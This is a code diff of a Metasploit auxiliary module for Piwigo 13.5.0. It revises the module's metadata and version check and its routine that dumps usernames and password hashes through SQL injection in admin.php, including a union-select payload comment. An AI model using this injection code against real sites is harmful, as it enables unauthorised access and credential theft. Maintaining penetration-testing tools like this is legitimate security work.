@@ -27,15 +27,9 @@ class MetasploitModule < Msf::Auxiliary
           ['Thanks', 'Tempest Security', 'Henrique Arcoverde']
 
         ],
-        'DisclosureData' => '2023-04-21',
-        'Platform' => 'ruby',
-        'Arch' => ARCH_RUBY,
-        'Privileged' => true,
-        'Targets' => [['Automatic', {}]],
-        'DefaultTarget' => 0,
+        'DisclosureDate' => '2023-04-21',
         'Notes' => {
           'Stability' => ['CRASH_SAFE'],
-          'Reliability' => ['REPEATABLE_SESSION'],
           'SideEffects' => ['IOC_IN_LOGS']
         }
       )
@@ -56,16 +50,16 @@ class MetasploitModule < Msf::Auxiliary
     res = send_request_cgi(
       'method' => 'GET',
       'keep_cookies' => true,
-      'uri' => normalize_uri(login_page)
+      'uri' => login_page
     )
 
-    if res && res.code == 200
-      return res
+    if res && res.code == 200 && res.body.match(/jquery.min.js?v13.5.0/)
+      return Exploit::CheckCode::Detected('The target is running Piwigo with version 13.5.0')
     else
-      print_error('[!] could not find any piwigo instance')
+      return Exploit::CheckCode::Safe('The target does not appear to be running Piwigo with vulnerable version')
     end
-
-    return res
+  rescue ::Rex::ConnectionError
+    return Exploit::CheckCode::Unknown("#{peer} - Connection failed")
   end
 
   def login(response)
@@ -139,7 +133,7 @@ class MetasploitModule < Msf::Auxiliary
       end
       rows_data = creds_table.rows.length
       if rows_data > 1
-        print_good("get your l00t $\n")
+        print_status("Dump of usernames and hashes:\n")
         print_line creds_table.to_s
       end
     end
@@ -147,7 +141,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def get_info
     # 123123123 union all select group_concat(username,password) from piwigo_users
-    @sqli = create_sqli(dbms: MySQLi::Common, opts: { hex_encode_strings: true }) do |payload|
+    sqli = create_sqli(dbms: MySQLi::Common, opts: { hex_encode_strings: true }) do |payload|
       send_request_cgi({
         'method' => 'GET',
         'uri' => normalize_uri(target_uri.path, 'admin.php'),
@@ -159,8 +153,8 @@ class MetasploitModule < Msf::Auxiliary
       })
     end
 
-    if test_vulnerable(@sqli.run_sql('select 0x70776e3364'))
-      dump_data(@sqli)
+    if test_vulnerable(sqli.run_sql('select 0x70776e3364'))
+      dump_data(sqli)
     end
   end
 
